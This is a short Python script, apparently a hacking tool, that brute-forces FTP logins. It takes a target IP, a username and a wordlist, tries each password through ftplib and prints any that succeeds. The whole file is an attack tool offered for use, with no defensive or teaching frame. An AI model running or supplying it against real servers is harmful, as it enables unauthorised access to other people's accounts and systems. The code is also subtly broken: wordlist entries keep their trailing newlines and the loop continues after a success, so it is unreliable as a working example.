

import ftplib

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

try:
	file1 = open('ftpbrute.txt', 'r')
	print(' ')
	print (bcolors.OKGREEN + file1.read() + bcolors.ENDC)
	file1.close()
except IOError:
	print('Banner File not found!\n')


gateway = input("Enter gateway IP Address: ")
print("\n")
name = input("Enter gateway name: ")
print("\n")
wordlist = input("Enter wordlist filepath: ")
print("\n")

flag = 0

try:
    passfile = open(wordlist, "r")
except:
    print("No file found !\n")
    quit()

for passwd in passfile:

    try:
        ftp = ftplib.FTP(gateway, name, passwd)
        print("[+] {0:*^50}".format("Password found :D\n"))
        print("[+] Password is: {0}".format(passwd))
        print("[+]{0:*^50}".format(""))
        flag = 1

    except:
        print("[-] Password Trying...{0}".format(passwd))
	
print("\n")
if (flag == 0):
    print ("Password not found :(\n")
    print ("Please modify your wordlist !\n")











